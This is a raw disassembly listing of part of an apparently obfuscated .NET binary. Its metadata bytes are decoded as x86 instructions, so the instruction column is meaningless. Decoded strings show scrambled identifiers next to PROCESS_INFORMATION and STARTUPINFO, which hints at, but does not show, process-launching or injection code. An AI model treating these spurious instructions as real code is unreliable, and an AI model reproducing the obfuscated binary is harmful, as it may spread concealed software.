10002bcf:	01 2e                	add    %ebp,(%esi)
10002bd1:	00 43 00             	add    %al,0x0(%ebx)
10002bd4:	e1 01                	loope  0x10002bd7
10002bd6:	2e 00 4b 00          	add    %cl,%cs:0x0(%ebx)
10002bda:	fb                   	sti
10002bdb:	01 2e                	add    %ebp,(%esi)
10002bdd:	00 53 00             	add    %dl,0x0(%ebx)
10002be0:	f5                   	cmc
10002be1:	01 2e                	add    %ebp,(%esi)
10002be3:	00 5b 00             	add    %bl,0x0(%ebx)
10002be6:	f5                   	cmc
10002be7:	01 2e                	add    %ebp,(%esi)
10002be9:	00 63 00             	add    %ah,0x0(%ebx)
10002bec:	13 02                	adc    (%edx),%eax
10002bee:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
10002bf2:	3d 02 2e 00 73       	cmp    $0x73002e02,%eax
10002bf7:	00 4a 02             	add    %cl,0x2(%edx)
10002bfa:	a3 00 7b 00 94       	mov    %eax,0x94007b00
10002bff:	02 c3                	add    %bl,%al
10002c01:	00 7b 00             	add    %bh,0x0(%ebx)
10002c04:	94                   	xchg   %eax,%esp
10002c05:	02 60 01             	add    0x1(%eax),%ah
10002c08:	7b 00                	jnp    0x10002c0a
10002c0a:	94                   	xchg   %eax,%esp
10002c0b:	02 80 01 7b 00 94    	add    -0x6bff84ff(%eax),%al
10002c11:	02 1a                	add    (%edx),%bl
10002c13:	00 b4 00 f4 00 2f 07 	add    %dh,0x72f00f4(%eax,%eax,1)
10002c1a:	73 00                	jae    0x10002c1c
10002c1c:	bb 00 d1 00 40       	mov    $0x4000d100,%ebx
10002c21:	01 03                	add    %eax,(%ebx)
10002c23:	00 57 04             	add    %dl,0x4(%edi)
10002c26:	01 00                	add    %eax,(%eax)
10002c28:	40                   	inc    %eax
10002c29:	01 05 00 69 04 01    	add    %eax,0x1046900
10002c2f:	00 40 01             	add    %al,0x1(%eax)
10002c32:	07                   	pop    %es
10002c33:	00 de                	add    %bl,%dh
10002c35:	08 01                	or     %al,(%ecx)
10002c37:	00 40 01             	add    %al,0x1(%eax)
10002c3a:	09 00                	or     %eax,(%eax)
10002c3c:	c0 09 01             	rorb   $0x1,(%ecx)
10002c3f:	00 40 01             	add    %al,0x1(%eax)
10002c42:	0d 00 73 09 01       	or     $0x1097300,%eax
10002c47:	00 00                	add    %al,(%eax)
10002c49:	01 0f                	add    %ecx,(%edi)
10002c4b:	00 b6 04 01 00 04    	add    %dh,0x4000104(%esi)
10002c51:	80 00 00             	addb   $0x0,(%eax)
10002c54:	01 00                	add    %eax,(%eax)
	...
10002c62:	51                   	push   %ecx
10002c63:	03 00                	add    (%eax),%eax
10002c65:	00 04 00             	add    %al,(%eax,%eax,1)
	...
10002c70:	00 00                	add    %al,(%eax)
10002c72:	28 01                	sub    %al,(%ecx)
10002c74:	06                   	push   %es
10002c75:	04 00                	add    $0x0,%al
10002c77:	00 00                	add    %al,(%eax)
10002c79:	00 04 00             	add    %al,(%eax,%eax,1)
	...
10002c84:	00 00                	add    %al,(%eax)
10002c86:	28 01                	sub    %al,(%ecx)
10002c88:	76 07                	jbe    0x10002c91
10002c8a:	00 00                	add    %al,(%eax)
10002c8c:	00 00                	add    %al,(%eax)
10002c8e:	04 00                	add    $0x0,%al
	...
10002c98:	00 00                	add    %al,(%eax)
10002c9a:	28 01                	sub    %al,(%ecx)
10002c9c:	e4 04                	in     $0x4,%al
10002c9e:	00 00                	add    %al,(%eax)
10002ca0:	00 00                	add    %al,(%eax)
10002ca2:	03 00                	add    (%eax),%eax
10002ca4:	02 00                	add    (%eax),%al
10002ca6:	04 00                	add    $0x0,%al
10002ca8:	02 00                	add    (%eax),%al
10002caa:	05 00 02 00 06       	add    $0x6000200,%eax
10002caf:	00 02                	add    %al,(%edx)
10002cb1:	00 21                	add    %ah,(%ecx)
10002cb3:	00 2e                	add    %ch,(%esi)
10002cb5:	00 39                	add    %bh,(%ecx)
10002cb7:	00 6f 00             	add    %ch,0x0(%edi)
10002cba:	3d 00 98 00 3f       	cmp    $0x3f009800,%eax
10002cbf:	00 aa 00 4d 00 6f    	add    %ch,0x6f004d00(%edx)
10002cc5:	00 3f                	add    %bh,(%edi)
10002cc7:	00 6f 00             	add    %ch,0x0(%edi)
10002cca:	00 00                	add    %al,(%eax)
10002ccc:	00 3c 3e             	add    %bh,(%esi,%edi,1)
10002ccf:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
10002cd2:	31 30                	xor    %esi,(%eax)
10002cd4:	5f                   	pop    %edi
10002cd5:	30 00                	xor    %al,(%eax)
10002cd7:	3c 54                	cmp    $0x54,%al
10002cd9:	4c                   	dec    %esp
10002cda:	4d                   	dec    %ebp
10002cdb:	4b                   	dec    %ebx
10002cdc:	7a 41                	jp     0x10002d1f
10002cde:	4e                   	dec    %esi
10002cdf:	66 65 5a             	gs pop %dx
10002ce2:	47                   	inc    %edi
10002ce3:	6c                   	insb   (%dx),%es:(%edi)
10002ce4:	61                   	popa
10002ce5:	6d                   	insl   (%dx),%es:(%edi)
10002ce6:	5a                   	pop    %edx
10002ce7:	78 4d                	js     0x10002d36
10002ce9:	38 32                	cmp    %dh,(%edx)
10002ceb:	35 30 7a 4c 31       	xor    $0x314c7a30,%eax
10002cf0:	71 3e                	jno    0x10002d30
10002cf2:	62 5f 5f             	bound  %ebx,0x5f(%edi)
10002cf5:	31 30                	xor    %esi,(%eax)
10002cf7:	5f                   	pop    %edi
10002cf8:	30 00                	xor    %al,(%eax)
10002cfa:	3c 3e                	cmp    $0x3e,%al
10002cfc:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
10002cff:	44                   	inc    %esp
10002d00:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
10002d07:	6c                   	insb   (%dx),%es:(%edi)
10002d08:	61                   	popa
10002d09:	73 73                	jae    0x10002d7e
10002d0b:	36 5f                	ss pop %edi
10002d0d:	30 00                	xor    %al,(%eax)
10002d0f:	3c 53                	cmp    $0x53,%al
10002d11:	4f                   	dec    %edi
10002d12:	65 51                	gs push %ecx
10002d14:	42                   	inc    %edx
10002d15:	62 36                	bound  %esi,(%esi)
10002d17:	71 50                	jno    0x10002d69
10002d19:	32 69 33             	xor    0x33(%ecx),%ch
10002d1c:	48                   	dec    %eax
10002d1d:	68 74 6e 47 56       	push   $0x56476e74
10002d22:	71 74                	jno    0x10002d98
10002d24:	79 3e                	jns    0x10002d64
10002d26:	67 5f                	addr16 pop %edi
10002d28:	5f                   	pop    %edi
10002d29:	57                   	push   %edi
10002d2a:	4a                   	dec    %edx
10002d2b:	42                   	inc    %edx
10002d2c:	46                   	inc    %esi
10002d2d:	63 45 30             	arpl   %eax,0x30(%ebp)
10002d30:	6e                   	outsb  %ds:(%esi),(%dx)
10002d31:	38 7a 6e             	cmp    %bh,0x6e(%edx)
10002d34:	58                   	pop    %eax
10002d35:	49                   	dec    %ecx
10002d36:	58                   	pop    %eax
10002d37:	51                   	push   %ecx
10002d38:	72 61                	jb     0x10002d9b
10002d3a:	4c                   	dec    %esp
10002d3b:	49                   	dec    %ecx
10002d3c:	68 32 49 47 43       	push   $0x43474932
10002d41:	7c 36                	jl     0x10002d79
10002d43:	5f                   	pop    %edi
10002d44:	30 00                	xor    %al,(%eax)
10002d46:	3c 3e                	cmp    $0x3e,%al
10002d48:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
10002d4b:	39 5f 30             	cmp    %ebx,0x30(%edi)
10002d4e:	00 3c 59             	add    %bh,(%ecx,%ebx,2)
10002d51:	43                   	inc    %ebx
10002d52:	43                   	inc    %ebx
10002d53:	6e                   	outsb  %ds:(%esi),(%dx)
10002d54:	49                   	dec    %ecx
10002d55:	6b 4c 62 46 51       	imul   $0x51,0x46(%edx,%eiz,2),%ecx
10002d5a:	66 73 32             	data16 jae 0x10002d8f
10002d5d:	4d                   	dec    %ebp
10002d5e:	49                   	dec    %ecx
10002d5f:	6d                   	insl   (%dx),%es:(%edi)
10002d60:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
10002d64:	39 5f 30             	cmp    %ebx,0x30(%edi)
10002d67:	00 46 61             	add    %al,0x61(%esi)
10002d6a:	64 64 42             	fs fs inc %edx
10002d6d:	76 44                	jbe    0x10002db3
10002d6f:	34 6f                	xor    $0x6f,%al
10002d71:	55                   	push   %ebp
10002d72:	49                   	dec    %ecx
10002d73:	41                   	inc    %ecx
10002d74:	44                   	inc    %esp
10002d75:	39 38                	cmp    %edi,(%eax)
10002d77:	6f                   	outsl  %ds:(%esi),(%dx)
10002d78:	77 30                	ja     0x10002daa
10002d7a:	00 4b 50             	add    %cl,0x50(%ebx)
10002d7d:	50                   	push   %eax
10002d7e:	78 48                	js     0x10002dc8
10002d80:	42                   	inc    %edx
10002d81:	4c                   	dec    %esp
10002d82:	79 7a                	jns    0x10002dfe
10002d84:	6a 76                	push   $0x76
10002d86:	75 32                	jne    0x10002dba
10002d88:	31 00                	xor    %eax,(%eax)
10002d8a:	4e                   	dec    %esi
10002d8b:	76 57                	jbe    0x10002de4
10002d8d:	47                   	inc    %edi
10002d8e:	4b                   	dec    %ebx
10002d8f:	46                   	inc    %esi
10002d90:	66 30 42 67          	data16 xor %al,0x67(%edx)
10002d94:	62 48 5a             	bound  %ecx,0x5a(%eax)
10002d97:	4b                   	dec    %ebx
10002d98:	66 42                	inc    %dx
10002d9a:	66 4a                	dec    %dx
10002d9c:	57                   	push   %edi
10002d9d:	38 61 44             	cmp    %ah,0x44(%ecx)
10002da0:	4b                   	dec    %ebx
10002da1:	58                   	pop    %eax
10002da2:	31 00                	xor    %eax,(%eax)
10002da4:	3c 53                	cmp    $0x53,%al
10002da6:	4f                   	dec    %edi
10002da7:	65 51                	gs push %ecx
10002da9:	42                   	inc    %edx
10002daa:	62 36                	bound  %esi,(%esi)
10002dac:	71 50                	jno    0x10002dfe
10002dae:	32 69 33             	xor    0x33(%ecx),%ch
10002db1:	48                   	dec    %eax
10002db2:	68 74 6e 47 56       	push   $0x56476e74
10002db7:	71 74                	jno    0x10002e2d
10002db9:	79 3e                	jns    0x10002df9
10002dbb:	67 5f                	addr16 pop %edi
10002dbd:	5f                   	pop    %edi
10002dbe:	47                   	inc    %edi
10002dbf:	59                   	pop    %ecx
10002dc0:	44                   	inc    %esp
10002dc1:	6f                   	outsl  %ds:(%esi),(%dx)
10002dc2:	61                   	popa
10002dc3:	4f                   	dec    %edi
10002dc4:	31 6d 7a             	xor    %ebp,0x7a(%ebp)
10002dc7:	78 33                	js     0x10002dfc
10002dc9:	51                   	push   %ecx
10002dca:	47                   	inc    %edi
10002dcb:	47                   	inc    %edi
10002dcc:	61                   	popa
10002dcd:	67 43                	addr16 inc %ebx
10002dcf:	5a                   	pop    %edx
10002dd0:	4a                   	dec    %edx
10002dd1:	5a                   	pop    %edx
10002dd2:	46                   	inc    %esi
10002dd3:	5a                   	pop    %edx
10002dd4:	6a 7c                	push   $0x7c
10002dd6:	36 5f                	ss pop %edi
10002dd8:	31 00                	xor    %eax,(%eax)
10002dda:	49                   	dec    %ecx
10002ddb:	45                   	inc    %ebp
10002ddc:	6e                   	outsb  %ds:(%esi),(%dx)
10002ddd:	75 6d                	jne    0x10002e4c
10002ddf:	65 72 61             	gs jb  0x10002e43
10002de2:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
10002de6:	31 00                	xor    %eax,(%eax)
10002de8:	4c                   	dec    %esp
10002de9:	69 73 74 60 31 00 3c 	imul   $0x3c003160,0x74(%ebx),%esi
10002df0:	53                   	push   %ebx
10002df1:	4f                   	dec    %edi
10002df2:	65 51                	gs push %ecx
10002df4:	42                   	inc    %edx
10002df5:	62 36                	bound  %esi,(%esi)
10002df7:	71 50                	jno    0x10002e49
10002df9:	32 69 33             	xor    0x33(%ecx),%ch
10002dfc:	48                   	dec    %eax
10002dfd:	68 74 6e 47 56       	push   $0x56476e74
10002e02:	71 74                	jno    0x10002e78
10002e04:	79 3e                	jns    0x10002e44
10002e06:	62 5f 5f             	bound  %ebx,0x5f(%edi)
10002e09:	32 00                	xor    (%eax),%al
10002e0b:	46                   	inc    %esi
10002e0c:	75 6e                	jne    0x10002e7c
10002e0e:	63 60 32             	arpl   %esp,0x32(%eax)
10002e11:	00 43 59             	add    %al,0x59(%ebx)
10002e14:	63 61 57             	arpl   %esp,0x57(%ecx)
10002e17:	44                   	inc    %esp
10002e18:	77 41                	ja     0x10002e5b
10002e1a:	34 77                	xor    $0x77,%al
10002e1c:	4c                   	dec    %esp
10002e1d:	47                   	inc    %edi
10002e1e:	66 55                	push   %bp
10002e20:	41                   	inc    %ecx
10002e21:	78 46                	js     0x10002e69
10002e23:	63 34 00             	arpl   %esi,(%eax,%eax,1)
10002e26:	4c                   	dec    %esp
10002e27:	68 67 48 50 6e       	push   $0x6e504867
10002e2c:	6c                   	insb   (%dx),%es:(%edi)
10002e2d:	54                   	push   %esp
10002e2e:	71 47                	jno    0x10002e77
10002e30:	62 37                	bound  %esi,(%edi)
10002e32:	50                   	push   %eax
10002e33:	4a                   	dec    %edx
10002e34:	63 31                	arpl   %esi,(%ecx)
10002e36:	4d                   	dec    %ebp
10002e37:	6b 68 68 46          	imul   $0x46,0x68(%eax),%ebp
10002e3b:	50                   	push   %eax
10002e3c:	35 00 44 5a 54       	xor    $0x545a4400,%eax
10002e41:	63 43 65             	arpl   %eax,0x65(%ebx)
10002e44:	37                   	aaa
10002e45:	71 72                	jno    0x10002eb9
10002e47:	73 71                	jae    0x10002eba
10002e49:	54                   	push   %esp
10002e4a:	64 30 55 63          	xor    %dl,%fs:0x63(%ebp)
10002e4e:	50                   	push   %eax
10002e4f:	63 75 71             	arpl   %esi,0x71(%ebp)
10002e52:	63 55 36             	arpl   %edx,0x36(%ebp)
10002e55:	64 35 00 67 65 74    	fs xor $0x74656700,%eax
10002e5b:	5f                   	pop    %edi
10002e5c:	55                   	push   %ebp
10002e5d:	54                   	push   %esp
10002e5e:	46                   	inc    %esi
10002e5f:	38 00                	cmp    %al,(%eax)
10002e61:	3c 3e                	cmp    $0x3e,%al
10002e63:	39 00                	cmp    %eax,(%eax)
10002e65:	3c 4d                	cmp    $0x4d,%al
10002e67:	6f                   	outsl  %ds:(%esi),(%dx)
10002e68:	64 75 6c             	fs jne 0x10002ed7
10002e6b:	65 3e 00 52 66       	gs add %dl,%ds:0x66(%edx)
10002e70:	6c                   	insb   (%dx),%es:(%edi)
10002e71:	66 56                	push   %si
10002e73:	56                   	push   %esi
10002e74:	67 6f                	outsl  %ds:(%si),(%dx)
10002e76:	55                   	push   %ebp
10002e77:	42                   	inc    %edx
10002e78:	33 68 68             	xor    0x68(%eax),%ebp
10002e7b:	44                   	inc    %esp
10002e7c:	6a 38                	push   $0x38
10002e7e:	50                   	push   %eax
10002e7f:	70 45                	jo     0x10002ec6
10002e81:	4b                   	dec    %ebx
10002e82:	76 43                	jbe    0x10002ec7
10002e84:	00 55 4f             	add    %dl,0x4f(%ebp)
10002e87:	66 66 70 69          	data16 data16 jo 0x10002ef4
10002e8b:	6e                   	outsb  %ds:(%esi),(%dx)
10002e8c:	56                   	push   %esi
10002e8d:	6a 70                	push   $0x70
10002e8f:	6b 53 5a 62          	imul   $0x62,0x5a(%ebx),%edx
10002e93:	34 44                	xor    $0x44,%al
10002e95:	00 49 6a             	add    %cl,0x6a(%ecx)
10002e98:	66 64 55             	fs push %bp
10002e9b:	4c                   	dec    %esp
10002e9c:	78 6e                	js     0x10002f0c
10002e9e:	48                   	dec    %eax
10002e9f:	34 33                	xor    $0x33,%al
10002ea1:	73 35                	jae    0x10002ed8
10002ea3:	30 36                	xor    %dh,(%esi)
10002ea5:	78 38                	js     0x10002edf
10002ea7:	48                   	dec    %eax
10002ea8:	44                   	inc    %esp
10002ea9:	00 4a 6a             	add    %cl,0x6a(%edx)
10002eac:	61                   	popa
10002ead:	54                   	push   %esp
10002eae:	45                   	inc    %ebp
10002eaf:	4e                   	dec    %esi
10002eb0:	70 32                	jo     0x10002ee4
10002eb2:	31 74 5a 4e          	xor    %esi,0x4e(%edx,%ebx,2)
10002eb6:	4e                   	dec    %esi
10002eb7:	44                   	inc    %esp
10002eb8:	00 42 66             	add    %al,0x66(%edx)
10002ebb:	78 79                	js     0x10002f36
10002ebd:	6a 7a                	push   $0x7a
10002ebf:	58                   	pop    %eax
10002ec0:	49                   	dec    %ecx
10002ec1:	76 70                	jbe    0x10002f33
10002ec3:	46                   	inc    %esi
10002ec4:	35 75 41 4f 4d       	xor    $0x4d4f4175,%eax
10002ec9:	77 4d                	ja     0x10002f18
10002ecb:	46                   	inc    %esi
10002ecc:	41                   	inc    %ecx
10002ecd:	46                   	inc    %esi
10002ece:	31 46 00             	xor    %eax,0x0(%esi)
10002ed1:	42                   	inc    %edx
10002ed2:	59                   	pop    %ecx
10002ed3:	4c                   	dec    %esp
10002ed4:	79 55                	jns    0x10002f2b
10002ed6:	76 77                	jbe    0x10002f4f
10002ed8:	59                   	pop    %ecx
10002ed9:	4b                   	dec    %ebx
10002eda:	6f                   	outsl  %ds:(%esi),(%dx)
10002edb:	66 71 43             	data16 jno 0x10002f21
10002ede:	4b                   	dec    %ebx
10002edf:	5a                   	pop    %edx
10002ee0:	38 4c 4d 5a          	cmp    %cl,0x5a(%ebp,%ecx,2)
10002ee4:	52                   	push   %edx
10002ee5:	38 49 00             	cmp    %cl,0x0(%ecx)
10002ee8:	55                   	push   %ebp
10002ee9:	52                   	push   %edx
10002eea:	46                   	inc    %esi
10002eeb:	4a                   	dec    %edx
10002eec:	6d                   	insl   (%dx),%es:(%edi)
10002eed:	79 77                	jns    0x10002f66
10002eef:	42                   	inc    %edx
10002ef0:	31 32                	xor    %esi,(%edx)
10002ef2:	55                   	push   %ebp
10002ef3:	72 70                	jb     0x10002f65
10002ef5:	49                   	dec    %ecx
10002ef6:	00 58 54             	add    %bl,0x54(%eax)
10002ef9:	75 64                	jne    0x10002f5f
10002efb:	64 53                	fs push %ebx
10002efd:	7a 61                	jp     0x10002f60
10002eff:	32 49 49             	xor    0x49(%ecx),%cl
10002f02:	65 48                	gs dec %eax
10002f04:	4c                   	dec    %esp
10002f05:	69 78 76 46 35 38 4a 	imul   $0x4a383546,0x76(%eax),%edi
10002f0c:	00 47 75             	add    %al,0x75(%edi)
10002f0f:	54                   	push   %esp
10002f10:	54                   	push   %esp
10002f11:	65 6b 35 35 54 57 72 	imul   $0x30,%gs:0x72575435,%esi
10002f18:	30 
10002f19:	36 76 73             	ss jbe 0x10002f8f
10002f1c:	56                   	push   %esi
10002f1d:	63 39                	arpl   %edi,(%ecx)
10002f1f:	4f                   	dec    %edi
10002f20:	77 4a                	ja     0x10002f6c
10002f22:	51                   	push   %ecx
10002f23:	4b                   	dec    %ebx
10002f24:	00 45 52             	add    %al,0x52(%ebp)
10002f27:	73 61                	jae    0x10002f8a
10002f29:	47                   	inc    %edi
10002f2a:	66 79 6d             	data16 jns 0x10002f9a
10002f2d:	77 44                	ja     0x10002f73
10002f2f:	68 6e 6f 4b 00       	push   $0x4b6f6e
10002f34:	43                   	inc    %ebx
10002f35:	55                   	push   %ebp
10002f36:	62 70 73             	bound  %esi,0x73(%eax)
10002f39:	48                   	dec    %eax
10002f3a:	47                   	inc    %edi
10002f3b:	30 6f 36             	xor    %ch,0x36(%edi)
10002f3e:	39 55 37             	cmp    %edx,0x37(%ebp)
10002f41:	49                   	dec    %ecx
10002f42:	6c                   	insb   (%dx),%es:(%edi)
10002f43:	5a                   	pop    %edx
10002f44:	68 39 4f 4c 00       	push   $0x4c4f39
10002f49:	45                   	inc    %ebp
10002f4a:	71 42                	jno    0x10002f8e
10002f4c:	71 49                	jno    0x10002f97
10002f4e:	58                   	pop    %eax
10002f4f:	4a                   	dec    %edx
10002f50:	62 68 4e             	bound  %ebp,0x4e(%eax)
10002f53:	66 35 7a 75          	xor    $0x757a,%ax
10002f57:	73 43                	jae    0x10002f9c
10002f59:	35 7a 47 31 6b       	xor    $0x6b31477a,%eax
10002f5e:	45                   	inc    %ebp
10002f5f:	4e                   	dec    %esi
10002f60:	00 50 52             	add    %dl,0x52(%eax)
10002f63:	4f                   	dec    %edi
10002f64:	43                   	inc    %ebx
10002f65:	45                   	inc    %ebp
10002f66:	53                   	push   %ebx
10002f67:	53                   	push   %ebx
10002f68:	5f                   	pop    %edi
10002f69:	49                   	dec    %ecx
10002f6a:	4e                   	dec    %esi
10002f6b:	46                   	inc    %esi
10002f6c:	4f                   	dec    %edi
10002f6d:	52                   	push   %edx
10002f6e:	4d                   	dec    %ebp
10002f6f:	41                   	inc    %ecx
10002f70:	54                   	push   %esp
10002f71:	49                   	dec    %ecx
10002f72:	4f                   	dec    %edi
10002f73:	4e                   	dec    %esi
10002f74:	00 53 54             	add    %dl,0x54(%ebx)
10002f77:	41                   	inc    %ecx
10002f78:	52                   	push   %edx
10002f79:	54                   	push   %esp
10002f7a:	55                   	push   %ebp
10002f7b:	50                   	push   %eax
10002f7c:	49                   	dec    %ecx
10002f7d:	4e                   	dec    %esi
10002f7e:	46                   	inc    %esi
10002f7f:	4f                   	dec    %edi
10002f80:	00 53 79             	add    %dl,0x79(%ebx)
10002f83:	73 74                	jae    0x10002ff9
10002f85:	65 6d                	gs insl (%dx),%es:(%edi)
10002f87:	2e 49                	cs dec %ecx
10002f89:	4f                   	dec    %edi
10002f8a:	00 5a 47             	add    %bl,0x47(%edx)
10002f8d:	71 63                	jno    0x10002ff2
10002f8f:	57                   	push   %edi
10002f90:	76 67                	jbe    0x10002ff9
10002f92:	53                   	push   %ebx
10002f93:	78 78                	js     0x1000300d
10002f95:	53                   	push   %ebx
10002f96:	73 79                	jae    0x10003011
10002f98:	77 33                	ja     0x10002fcd
10002f9a:	59                   	pop    %ecx
10002f9b:	30 79 61             	xor    %bh,0x61(%ecx)
10002f9e:	54                   	push   %esp
10002f9f:	49                   	dec    %ecx
10002fa0:	66 4f                	dec    %di
10002fa2:	00 52 45             	add    %dl,0x45(%edx)
10002fa5:	6c                   	insb   (%dx),%es:(%edi)
10002fa6:	71 64                	jno    0x1000300c
10002fa8:	4f                   	dec    %edi
10002fa9:	38 34 6e             	cmp    %dh,(%esi,%ebp,2)
10002fac:	4b                   	dec    %ebx
10002fad:	78 4f                	js     0x10002ffe
10002faf:	71 48                	jno    0x10002ff9
10002fb1:	70 78                	jo     0x1000302b
10002fb3:	61                   	popa
10002fb4:	4c                   	dec    %esp
10002fb5:	6b 53 6e 57          	imul   $0x57,0x6e(%ebx),%edx
10002fb9:	71 4f                	jno    0x1000300a
10002fbb:	00 57 4e             	add    %dl,0x4e(%edi)
10002fbe:	7a 75                	jp     0x10003035
10002fc0:	72 55                	jb     0x10003017
10002fc2:	4a                   	dec    %edx
10002fc3:	45                   	inc    %ebp
10002fc4:	77 78                	ja     0x1000303e
10002fc6:	70 33                	jo     0x10002ffb
10002fc8:	65 52                	gs push %edx
10002fca:	73 34                	jae    0x10003000
10002fcc:	54                   	push   %esp
10002fcd:	74 4f                	je     0x1000301e
10002fcf:	00 4b 57             	add    %cl,0x57(%ebx)
10002fd2:	78 59                	js     0x1000302d
10002fd4:	50                   	push   %eax
10002fd5:	6a 46                	push   $0x46
10002fd7:	51                   	push   %ecx
10002fd8:	6c                   	insb   (%dx),%es:(%edi)
10002fd9:	4e                   	dec    %esi
10002fda:	62 37                	bound  %esi,(%edi)
10002fdc:	67 5a                	addr16 pop %edx
10002fde:	51                   	push   %ecx
10002fdf:	00 53 51             	add    %dl,0x51(%ebx)
10002fe2:	73 6a                	jae    0x1000304e
10002fe4:	57                   	push   %edi
10002fe5:	54                   	push   %esp
10002fe6:	49                   	dec    %ecx
10002fe7:	4d                   	dec    %ebp
10002fe8:	55                   	push   %ebp
10002fe9:	46                   	inc    %esi
10002fea:	30 50 72             	xor    %dl,0x72(%eax)
10002fed:	51                   	push   %ecx
10002fee:	00 51 41             	add    %dl,0x41(%ecx)
10002ff1:	53                   	push   %ebx
10002ff2:	4e                   	dec    %esi
10002ff3:	4b                   	dec    %ebx
10002ff4:	42                   	inc    %edx
10002ff5:	6f                   	outsl  %ds:(%esi),(%dx)
10002ff6:	71 50                	jno    0x10003048
10002ff8:	42                   	inc    %edx
10002ff9:	74 65                	je     0x10003060
10002ffb:	56                   	push   %esi
10002ffc:	47                   	inc    %edi
10002ffd:	34 6e                	xor    $0x6e,%al
10002fff:	4f                   	dec    %edi
10003000:	57                   	push   %edi
10003001:	70 6d                	jo     0x10003070
10003003:	53                   	push   %ebx
10003004:	4a                   	dec    %edx
10003005:	73 51                	jae    0x10003058
10003007:	00 45 78             	add    %al,0x78(%ebp)
1000300a:	55                   	push   %ebp
1000300b:	4d                   	dec    %ebp
1000300c:	69 77 78 62 34 6a 44 	imul   $0x446a3462,0x78(%edi),%esi
10003013:	57                   	push   %edi
10003014:	78 75                	js     0x1000308b
10003016:	4e                   	dec    %esi
10003017:	73 6b                	jae    0x10003084
10003019:	6b 32 52             	imul   $0x52,(%edx),%esi
1000301c:	00 57 6c             	add    %dl,0x6c(%edi)
1000301f:	5a                   	pop    %edx
10003020:	52                   	push   %edx
10003021:	58                   	pop    %eax
10003022:	65 65 79 76          	gs gs jns 0x1000309c
10003026:	56                   	push   %esi
10003027:	65 76 44             	gs jbe 0x1000306e
1000302a:	54                   	push   %esp
1000302b:	00 41 44             	add    %al,0x44(%ecx)
1000302e:	49                   	dec    %ecx
1000302f:	75 68                	jne    0x10003099
10003031:	63 66 4c             	arpl   %esp,0x4c(%esi)
10003034:	77 34                	ja     0x1000306a
10003036:	47                   	inc    %edi
10003037:	48                   	dec    %eax
10003038:	54                   	push   %esp
10003039:	73 55                	jae    0x10003090
1000303b:	4d                   	dec    %ebp
1000303c:	4d                   	dec    %ebp
1000303d:	65 57                	gs push %edi
1000303f:	7a 6e                	jp     0x100030af
10003041:	65 4c                	gs dec %esp
10003043:	5a                   	pop    %edx
10003044:	54                   	push   %esp
10003045:	00 4e 69             	add    %cl,0x69(%esi)
10003048:	77 4a                	ja     0x10003094
1000304a:	70 65                	jo     0x100030b1
1000304c:	32 66 72             	xor    0x72(%esi),%ah
1000304f:	50                   	push   %eax
10003050:	6d                   	insl   (%dx),%es:(%edi)
10003051:	59                   	pop    %ecx
10003052:	43                   	inc    %ebx
10003053:	6e                   	outsb  %ds:(%esi),(%dx)
10003054:	49                   	dec    %ecx
10003055:	33 68 54             	xor    0x54(%eax),%ebp
10003058:	00 5a 71             	add    %bl,0x71(%edx)
1000305b:	63 54 4f 65          	arpl   %edx,0x65(%edi,%ecx,2)
1000305f:	68 6f 42 45 36       	push   $0x3645426f
10003064:	54                   	push   %esp
10003065:	61                   	popa
10003066:	4a                   	dec    %edx
10003067:	63 31                	arpl   %esi,(%ecx)
10003069:	42                   	inc    %edx
1000306a:	4f                   	dec    %edi
1000306b:	71 41                	jno    0x100030ae
1000306d:	56                   	push   %esi
1000306e:	37                   	aaa
1000306f:	4c                   	dec    %esp
10003070:	58                   	pop    %eax
10003071:	00 4b 45             	add    %cl,0x45(%ebx)
10003074:	61                   	popa
10003075:	46                   	inc    %esi
10003076:	65 73 51             	gs jae 0x100030ca
10003079:	62 79 6a             	bound  %edi,0x6a(%ecx)
1000307c:	78 36                	js     0x100030b4
1000307e:	71 47                	jno    0x100030c7
10003080:	57                   	push   %edi
10003081:	52                   	push   %edx
10003082:	70 58                	jo     0x100030dc
10003084:	00 64 77 58          	add    %ah,0x58(%edi,%esi,2)
10003088:	00 64 77 59          	add    %ah,0x59(%edi,%esi,2)
1000308c:	00 51 4b             	add    %dl,0x4b(%ecx)
1000308f:	69 47 72 79 73 53 53 	imul   $0x53537379,0x72(%edi),%eax
10003096:	62 31                	bound  %esi,(%ecx)
10003098:	69 77 59 00 59 42 75 	imul   $0x75425900,0x59(%edi),%esi
1000309f:	4a                   	dec    %edx
100030a0:	49                   	dec    %ecx
100030a1:	75 49                	jne    0x100030ec
100030a3:	59                   	pop    %ecx
100030a4:	6b 4a 74 39          	imul   $0x39,0x74(%edx),%ecx
100030a8:	41                   	inc    %ecx
100030a9:	31 5a 64             	xor    %ebx,0x64(%edx)
100030ac:	54                   	push   %esp
100030ad:	67 4c                	addr16 dec %esp
100030af:	4b                   	dec    %ebx
100030b0:	32 6b 54             	xor    0x54(%ebx),%ch
100030b3:	62 00                	bound  %eax,(%eax)
100030b5:	58                   	pop    %eax
100030b6:	6f                   	outsl  %ds:(%esi),(%dx)
100030b7:	6f                   	outsl  %ds:(%esi),(%dx)
100030b8:	69 72 75 37 36 49 4f 	imul   $0x4f493637,0x75(%edx),%esi
100030bf:	41                   	inc    %ecx
100030c0:	4b                   	dec    %ebx
100030c1:	4b                   	dec    %ebx
100030c2:	38 45 53             	cmp    %al,0x53(%ebp)
100030c5:	77 39                	ja     0x10003100
100030c7:	4f                   	dec    %edi
100030c8:	33 54 41 4e          	xor    0x4e(%ecx,%eax,2),%edx
100030cc:	57                   	push   %edi
100030cd:	62 00                	bound  %eax,(%eax)
100030cf:	63 62 00             	arpl   %esp,0x0(%edx)
100030d2:	6d                   	insl   (%dx),%es:(%edi)
100030d3:	73 63                	jae    0x10003138
100030d5:	6f                   	outsl  %ds:(%esi),(%dx)
100030d6:	72 6c                	jb     0x10003144
100030d8:	69 62 00 3c 3e 63 00 	imul   $0x633e3c,0x0(%edx),%esp
100030df:	53                   	push   %ebx
100030e0:	79 73                	jns    0x10003155
100030e2:	74 65                	je     0x10003149
100030e4:	6d                   	insl   (%dx),%es:(%edi)
100030e5:	2e 43                	cs inc %ebx
100030e7:	6f                   	outsl  %ds:(%esi),(%dx)
100030e8:	6c                   	insb   (%dx),%es:(%edi)
100030e9:	6c                   	insb   (%dx),%es:(%edi)
